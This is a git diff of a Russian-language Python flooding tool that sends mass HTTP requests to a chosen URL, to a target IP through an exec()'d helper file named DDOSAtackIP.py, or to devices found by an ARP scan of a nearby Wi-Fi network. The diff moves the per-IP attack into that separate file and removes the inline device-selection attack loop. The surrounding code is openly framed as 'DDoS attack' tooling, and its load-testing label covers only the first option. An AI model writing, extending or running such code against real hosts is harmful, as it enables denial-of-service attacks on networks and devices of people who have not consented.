@@ -4,6 +4,7 @@ import requests
 from pywifi import const
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from scapy.all import ARP, Ether, srp, conf
+import subprocess
 
 # Вывести список доступных интерфейсов
 print(conf.ifaces)
@@ -22,10 +23,9 @@ if chose == "1":
     url = input("Введите URL вашего сайта для нагрузочного тестирования: ")
     port = int(input("Введите порт для атаки (например, 80 для HTTP): "))  # Добавлено
     number_of_requests = int(input("Введите количество запросов: "))
-elif chose == "2":
-    ip = input("Введите IP для DDoS атаки: ")
-    port = int(input("Введите порт для атаки (например, 80 для HTTP): "))  # Добавлено
-    number_of_requests = int(input("Введите количество запросов: "))
+if chose == "2":
+    exec(open('DDoSAtack/DDOSAtackIP.py', 'r', encoding='utf-8').read())
+
 elif chose == "3":
     number_of_requests = int(input("Введите количество запросов для DDoS атаки на выбранную сеть: "))
 
@@ -34,17 +34,6 @@ def send_request_to_url():
     try:
         response = requests.get(f"{url}:{port}")  # Используем указанный порт
         return response.status_code, response.text
-    except requests.exceptions.RequestException as e:
-        return None, str(e)
-
-def send_request_to_ip(target_ip):
-    try:
-        response = requests.get(f"http://{target_ip}:{port}", timeout=5)  # Используем указанный порт
-        return response.status_code, response.text
-    except requests.exceptions.Timeout:
-        return None, f"Ошибка: Превышено время ожидания при подключении к {target_ip}."
-    except requests.exceptions.ConnectionError:
-        return None, f"Ошибка: Не удалось подключиться к {target_ip}."
     except requests.exceptions.RequestException as e:
         return None, str(e)
 
@@ -107,27 +96,11 @@ def ddos_wifi_network(network):
     for i, ip in enumerate(ip_addresses):
         print(f"{i + 1}. IP: {ip}")
 
-    # Выбор IP для DDoS атаки
-    while True:
-        try:
-            device_choice = int(input("Введите номер устройства для DDoS атаки (выберите из найденных устройств): ")) - 1
-            
-            if 0 <= device_choice < len(ip_addresses):  # Проверяем корректность ввода
-                selected_ip = ip_addresses[device_choice]
-                print(f"Начинаем DDoS атаку на {selected_ip}...")
-                generate_traffic(number_of_requests, send_request_to_ip, selected_ip)
-                break
-            else:
-                print("Некорректный выбор. Пожалуйста, выберите номер из списка.")
-        except ValueError:
-            print("Пожалуйста, введите корректный номер.")
 
 # Запуск генерации трафика
 if __name__ == "__main__":
     if chose == "1":
         generate_traffic(number_of_requests, send_request_to_url)
-    elif chose == "2":
-        generate_traffic(number_of_requests, send_request_to_ip)
     elif chose == "3":
         networks = scan_wifi_networks()
         network_choice = int(input("Выберите номер сети для атаки: ")) - 1
